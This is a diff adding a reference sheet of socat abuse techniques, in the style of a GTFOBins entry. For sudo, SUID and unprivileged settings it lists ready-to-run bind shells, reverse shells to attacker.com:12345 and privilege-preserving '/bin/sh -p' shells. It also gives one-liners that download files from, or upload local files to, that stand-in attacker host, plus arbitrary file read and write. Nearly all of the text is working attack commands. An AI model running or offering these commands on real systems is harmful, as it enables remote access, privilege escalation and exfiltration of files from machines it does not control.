@@ -1,0 +1,89 @@
+socat
+=====
+
+Bind shell
+----------
+
+[Sudo]
+    socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
+
+[SUID]
+    socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
+
+[Unprivileged]
+    socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
+
+Download
+--------
+
+[Sudo]
+    socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
+
+[SUID]
+    socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
+
+[Unprivileged]
+    socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
+
+File read
+---------
+
+[Sudo]
+    socat -u file:/path/to/input-file -
+
+[SUID]
+    socat -u file:/path/to/input-file -
+
+[Unprivileged]
+    socat -u file:/path/to/input-file -
+
+File write
+----------
+
+[Sudo]
+    socat -u 'exec:echo DATA' open:/path/to/output-file,creat
+    The `echo` command is actually used.
+
+[SUID]
+    socat -u 'exec:echo DATA' open:/path/to/output-file,creat
+    The `echo` command is actually used.
+
+[Unprivileged]
+    socat -u 'exec:echo DATA' open:/path/to/output-file,creat
+    The `echo` command is actually used.
+
+Reverse shell
+-------------
+
+[Sudo]
+    socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
+
+[SUID]
+    socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
+
+[Unprivileged]
+    socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
+
+Shell
+-----
+
+[Sudo]
+    socat - exec:/bin/sh,pty,ctty,raw,echo=0
+
+[SUID]
+    socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
+
+[Unprivileged]
+    socat - exec:/bin/sh,pty,ctty,raw,echo=0
+
+Upload
+------
+
+[Sudo]
+    socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
+
+[SUID]
+    socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
+
+[Unprivileged]
+    socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
